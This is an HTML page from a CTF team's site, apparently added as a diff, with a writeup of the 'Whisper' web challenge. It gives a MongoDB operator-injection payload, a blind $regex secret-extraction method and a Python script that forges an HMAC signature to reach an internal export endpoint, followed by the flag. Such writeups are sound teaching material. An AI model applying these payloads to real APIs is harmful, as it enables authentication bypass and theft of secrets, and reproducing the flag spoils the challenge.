@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Whisper · HICyberCon CTF 2026 writeup · NXT_CTFS</title>
+<meta name="description" content="The token endpoint passes raw JSON into a MongoDB lookup, so a $regex on the client secret becomes a blind oracle that leaks report-signer's secret one character at a time. The export endpoint's own error spells out the string to sign, and an HMAC over it returns the report." />
+<link rel="icon" href="../images/brand/logo-v2.png" type="image/png" />
+<link rel="stylesheet" href="../css/fonts.css?v=80d02232" />
+<link rel="stylesheet" href="../css/base.css?v=158fffd0" />
+<link rel="stylesheet" href="../css/components.css?v=9bb4ee8e" />
+<link rel="stylesheet" href="../css/pages.css?v=15906e9c" />
+<script>document.documentElement.classList.add('js');</script>
+</head>
+<body>
+
+<nav class="nav" id="nav">
+  <div class="container nav-inner">
+    <div class="nav-id">
+      <a href="../index.html#top" class="brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span class="brand-name">NXT_CTFS</span>
+      </a>
+    </div>
+    <div class="nav-links">
+      <a href="../writeups.html" class="is-active">writeups</a>
+      <a href="../index.html#team">team</a>
+      <a href="../index.html#shell">try a box</a>
+      <a href="../index.html#join">join</a>
+    </div>
+    <div class="nav-cta">
+      <a href="../index.html#join" class="btn btn-secondary">Join us</a>
+      <button class="nav-toggle" id="navToggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <line x1="4" y1="7" x2="20" y2="7"></line>
+          <line x1="4" y1="12" x2="20" y2="12"></line>
+          <line x1="4" y1="17" x2="20" y2="17"></line>
+        </svg>
+      </button>
+    </div>
+  </div>
+  <div class="mobile-panel" id="mobilePanel">
+    <a href="../writeups.html">writeups</a>
+    <a href="../index.html#team">team</a>
+    <a href="../index.html#shell">try a box</a>
+    <a href="../index.html#join">join</a>
+  </div>
+</nav>
+
+<div class="wu-progress" aria-hidden="true"><div class="wu-progress-bar" id="wuProgress"></div></div>
+  <main class="page-main container" id="top">
+  <nav class="crumbs" aria-label="Breadcrumb"><a href="../index.html#top">nxt_ctfs</a> <span aria-hidden="true">/</span> <a href="../writeups.html">writeups</a> <span aria-hidden="true">/</span> <a href="../events/hicybercon-ctf-2026.html">hicybercon-ctf-2026</a> <span aria-hidden="true">/</span> <span>whisper</span></nav>
+
+  <header class="page-head">
+    
+    <div class="page-head-body">
+      <h1>Whisper <span class="page-sub">Blind regex exfil, then a forged HMAC</span></h1>
+      <div class="page-meta"><span class="wu-cat wu-cat-web">web</span></div>
+      
+      <div class="wu-flagrow">
+        <span class="wu-flagrow-k">flag</span>
+        <code id="wuFlag">hiCTF{bl1nd_regex_3xfil_then_f0rge_the_cust0m_s1gn3r_34e2667220}</code>
+        <button type="button" class="wu-copy" data-copy="#wuFlag" aria-label="Copy flag">copy</button>
+      </div>
+    </div>
+  </header>
+
+    <div class="wu-layout">
+    <article class="wu-article">
+<p><strong>Category:</strong> Web / API · live instance (<code>Whisper</code> partner API gateway, v2.6)</p>
+<h2 id="recon"><a class="wu-anchor" href="#recon" aria-hidden="true">#</a>Recon</h2>
+<p><code>/clients</code> shows the registered partners: <code>public-web</code> (<code>read</code>) and
+<code>report-signer</code> (<code>read</code>, <code>report:export</code>). &quot;Only <code>report-signer</code> may export
+reports - and you don&#39;t have its secret.&quot;</p>
+<p><code>POST /api/token</code> exchanges <code>{client_id, client_secret}</code> for a token.</p>
+<h2 id="method"><a class="wu-anchor" href="#method" aria-hidden="true">#</a>Method</h2>
+<ol>
+<li><p><strong>Operator injection.</strong> <code>/api/token</code> passes the raw JSON body into a MongoDB
+lookup. <code>{&quot;client_id&quot;:&quot;public-web&quot;,&quot;client_secret&quot;:{&quot;$ne&quot;:null}}</code> returns a
+valid token without knowing any secret - and crucially the same lookup accepts
+<code>$regex</code>.</p>
+</li>
+<li><p><strong>Blind regex exfiltration.</strong> With <code>client_id=report-signer</code>, an anchored
+<code>client_secret: {&quot;$regex&quot;: &quot;^&lt;prefix&gt;&quot;}</code> returns HTTP 200 <strong>iff</strong> the real
+secret starts with <code>&lt;prefix&gt;</code>. Character-by-character recovery over the full
+charset yields:</p>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-1" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-1"><code class="language-text">secret = ecd232950de025dae73667bd8e958247</code></pre>
+      
+    </figure></li>
+<li><p><strong>Discover the internal signing scheme.</strong> <code>/internal/export</code> wants a request
+<strong>signature</strong>, not a bearer token. The mismatch error documents the string to
+sign verbatim:</p>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-2"><code class="language-text">METHOD \n PATH \n CANONICAL_QUERY \n HEX_SHA256(body) \n X-Timestamp</code></pre>
+      
+    </figure><p>The first signed call returns a replay-protection hint - add an <code>X-Nonce</code>
+header and append it as a final LF-separated line.</p>
+</li>
+<li><p><strong>Forge the signature.</strong> With the exfiltrated secret:</p>
+<figure class="wu-code wu-code-output" data-lines="2">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-3" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-3"><code class="language-text">HMAC-SHA256(secret,
+    &quot;POST\n/internal/export\n\n&lt;sha256(empty)&gt;\n&lt;timestamp&gt;\n&lt;nonce&gt;&quot;)</code></pre>
+      
+    </figure><p>→ <code>200</code> with the report containing the flag.</p>
+</li>
+</ol>
+<h2 id="repro"><a class="wu-anchor" href="#repro" aria-hidden="true">#</a>Repro</h2>
+<figure class="wu-code" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">bash</span>
+        <button type="button" class="wu-copy" data-copy="#code-4" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-4"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">python3 oracle.py        <span class="hljs-comment"># step 2: blind regex secret recovery</span></span></span></code></pre>
+      
+    </figure><figure class="wu-code" data-lines="12">
+      <figcaption>
+        
+        <span class="wu-code-lang">python</span>
+        <button type="button" class="wu-copy" data-copy="#code-5" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-5"><code class="language-python"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-comment"># step 4: sign the internal export request</span></span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc"><span class="hljs-keyword">import</span> hmac, hashlib, time, secrets, requests</span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">secret = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;ecd232950de025dae73667bd8e958247&quot;</span>)   <span class="hljs-comment"># from oracle.py</span></span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">ts, nonce = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(time.time())), secrets.token_hex(<span class="hljs-number">16</span>)</span></span>
+<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc">body = <span class="hljs-string">b&quot;&quot;</span></span></span>
+<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc">sts = (<span class="hljs-string">&quot;POST\n/internal/export\n\n&quot;</span> + hashlib.sha256(body).hexdigest()</span></span>
+<span class="wu-line" data-line="7"><span class="wu-ln">7</span><span class="wu-lc">       + <span class="hljs-string">f&quot;\n<span class="hljs-subst">{ts}</span>\n<span class="hljs-subst">{nonce}</span>&quot;</span>)</span></span>
+<span class="wu-line" data-line="8"><span class="wu-ln">8</span><span class="wu-lc">sig = hmac.new(secret, sts.encode(), hashlib.sha256).hexdigest()</span></span>
+<span class="wu-line" data-line="9"><span class="wu-ln">9</span><span class="wu-lc">r = requests.post(<span class="hljs-string">&quot;https://&lt;instance&gt;/internal/export&quot;</span>, data=body,</span></span>
+<span class="wu-line" data-line="10"><span class="wu-ln">10</span><span class="wu-lc">                  headers={<span class="hljs-string">&quot;X-Timestamp&quot;</span>: ts, <span class="hljs-string">&quot;X-Nonce&quot;</span>: nonce, <span class="hljs-string">&quot;X-Signature&quot;</span>: sig},</span></span>
+<span class="wu-line" data-line="11"><span class="wu-ln">11</span><span class="wu-lc">                  verify=<span class="hljs-literal">False</span>)</span></span>
+<span class="wu-line" data-line="12"><span class="wu-ln">12</span><span class="wu-lc"><span class="hljs-built_in">print</span>(r.text)</span></span></code></pre>
+      
+    </figure><h2 id="flag"><a class="wu-anchor" href="#flag" aria-hidden="true">#</a>Flag</h2>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-6" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-6"><code class="language-text">hiCTF{bl1nd_regex_3xfil_then_f0rge_the_cust0m_s1gn3r_34e2667220}</code></pre>
+      
+    </figure><h2 id="verification"><a class="wu-anchor" href="#verification" aria-hidden="true">#</a>Verification</h2>
+<p>The <code>/internal/export</code> call returns <code>200</code> <strong>with the report</strong> only when the
+HMAC over the documented canonical string matches - an authenticated response,
+not a guess. The secret itself is confirmed by a full-match anchored regex
+(<code>^…$</code>).</p>
+
+    </article>
+    <nav class="wu-toc" aria-label="On this page">
+        <button type="button" class="wu-toc-toggle" aria-expanded="false">On this page</button>
+        <p class="wu-toc-h">On this page</p>
+        <ol><li><a href="#recon">Recon</a></li><li><a href="#method">Method</a></li><li><a href="#repro">Repro</a></li><li><a href="#flag">Flag</a></li><li><a href="#verification">Verification</a></li></ol>
+      </nav>
+  </div>
+
+  <nav class="wu-pager" aria-label="More writeups">
+    <a class="wu-pager-link wu-pager-prev" href="orphaned-context.html"><span class="wu-pager-dir">&larr; Previous</span><span class="wu-pager-name">Orphaned Context</span></a>
+    <a class="wu-pager-link wu-pager-next" href="stillwell-estates.html"><span class="wu-pager-dir">Next &rarr;</span><span class="wu-pager-name">Stillwell Estates</span></a>
+  </nav>
+</main>
+
+<footer class="footer container">
+  <div class="footer-grid">
+    <div>
+      <a href="../index.html#top" class="footer-brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span>NXT_CTFS</span>
+      </a>
+      <p class="footer-tag">A team built around curiosity, persistence, and the occasional 3am breakthrough.</p>
+    </div>
+    <div class="footer-col">
+      <h4>Connect</h4>
+      <a href="https://discord.gg/AnmfSNMvS" target="_blank" rel="noopener noreferrer">Discord</a>
+      <a href="https://github.com/HappyCPPD/NxT-s-Team-Library" target="_blank" rel="noopener noreferrer">GitHub</a>
+      <a href="https://ctftime.org/team/442864" target="_blank" rel="noopener noreferrer">CTFtime</a>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <span>&copy; 2026 NXT_CTFS. All rights reserved.</span>
+    <span class="footer-hint">Two flags on this page. One is in the sandbox.</span>
+  </div>
+</footer>
+
+<script src="../js/script.js?v=2912532e"></script>
+</body>
+</html>
